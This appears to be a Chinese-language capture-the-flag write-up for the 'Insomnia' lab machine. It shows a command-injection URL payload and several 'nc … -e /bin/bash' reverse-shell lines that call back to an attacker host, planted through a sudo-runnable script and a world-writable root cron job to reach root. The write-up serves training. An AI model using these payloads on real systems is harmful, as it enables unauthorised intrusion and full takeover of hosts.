[{"title":"hackme","url":"/2025/08/04/hackme/","content":"\n## Insomnia\n\n扫描端口只开了一个8080,dirsearch扫目录\n\n扫到一个administration.php\n\n进行wfuzz得到参数是logfile\n\n尝试反弹shell\n\n```python\nhttp://192.168.56.59:8080/administration.php?logfile=;nc 192.168.56.4 1234 -e /bin/bash;\n```\n\nwww-data用户可以无密码指定julia执行start.sh\n\n```python\nwww-data@insomnia:~/html$ sudo -l\nsudo -l\nMatching Defaults entries for www-data on insomnia:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser www-data may run the following commands on insomnia:\n    (julia) NOPASSWD: /bin/bash /var/www/html/start.sh\n```\n\n这里我们发现start.sh所有用户都可读可写可执行\n\n```python\nwww-data@insomnia:~/html$ ls -al\nls -al\ntotal 60\ndrwxr-xr-x 3 www-data www-data  4096 May 29 09:55 .\ndrwxr-xr-x 3 root     root      4096 Dec 17  2020 ..\n-rw-r--r-- 1 www-data www-data   426 Dec 21  2020 administration.php\n-rw-r--r-- 1 www-data www-data  1610 Dec 20  2020 chat.js\n-rw-r--r-- 1 www-data www-data 19679 May 30 03:24 chat.txt\ndrwxr-xr-x 2 www-data www-data  4096 Dec 20  2020 images\n-rw-r--r-- 1 www-data www-data  2899 Dec 21  2020 index.php\n-rw-r--r-- 1 www-data www-data  1684 Dec 20  2020 process.php\n-rwxrwxrwx 1 root     root        38 May 30 03:16 start.sh\n-rw-r--r-- 1 www-data www-data  1363 Dec 20  2020 style.css\n```\n\n写反弹shell指令\n\n```python\nwww-data@insomnia:~/html$ cat start.sh\ncat start.sh\nphp -S 0.0.0.0:8080\nnc 192.168.56.4 12345 -e /bin/bash\n```\n\n进入julia用户后利用定时任务提权\n\n```python\njulia@insomnia:~$ cat /etc/crontab\ncat /etc/crontab\n# /etc/crontab: system-wide crontab\n# Unlike any other crontab you don't have to run the `crontab'\n# command to install the new version when you edit this file\n# and files in /etc/cron.d. These files also have username fields,\n# that none of the other crontabs do.\n\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# Example of job definition:\n# .---------------- minute (0 - 59)\n# |  .------------- hour (0 - 23)\n# |  |  .---------- day of month (1 - 31)\n# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...\n# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat\n# |  |  |  |  |\n# *  *  *  *  * user-name command to be executed\n17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly\n25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )\n47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )\n52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )\n*  *    * * *   root    /bin/bash /var/cron/check.sh\n```\n\n这里的check.sh也是全用户可读可写可执行\n\n```python\njulia@insomnia:~$ cat /var/cron/check.sh\ncat /var/cron/check.sh\n#!/bin/bash\nstatus=$(systemctl is-active insomnia.service)\nif [ \"$status\" == \"active\"  ]; then\n   echo \"OK\"\nelse\n   systemctl start  insomnia.service\nfi\nnc 192.168.56.4 1235 -e /bin/bash\n```\n\n监听等待即可\n\n```python\n┌──(kali㉿kali)-[~/Desktop/baji]\n└─$ nc -lvnp 1235\nlistening on [any] 1235 ...\nconnect to [192.168.56.4] from (UNKNOWN) [192.168.56.59] 47920\nid\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n","categories":["writeup"]}]